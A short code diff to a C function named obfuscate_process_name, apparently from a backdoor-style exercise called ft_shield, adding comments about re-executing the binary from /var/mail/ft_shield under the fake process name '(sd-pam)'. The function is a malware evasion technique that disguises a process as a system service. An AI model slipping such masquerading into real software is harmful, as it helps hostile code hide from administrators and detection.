@@ -21,6 +21,12 @@ int obfuscate_process_name(int argc, char **argv)
 	char *pr_name = "(sd-pam)";
 	if (strcmp(argv[0], pr_name) != 0)
 	{
+		// NOTE: this assumes if we are running on prod, hence hardcoded path
+		// will return -1 if we try to run payload directly
+		// resulting in partial payload obfustication
+
+		// however, on dev if /var/mail/ft_shield is present
+		// there will be confusing results where the changes are not applied
 		char *new_argv[] = {pr_name, NULL};
 		if (execv("/var/mail/ft_shield", new_argv) == -1)
 			return 1;
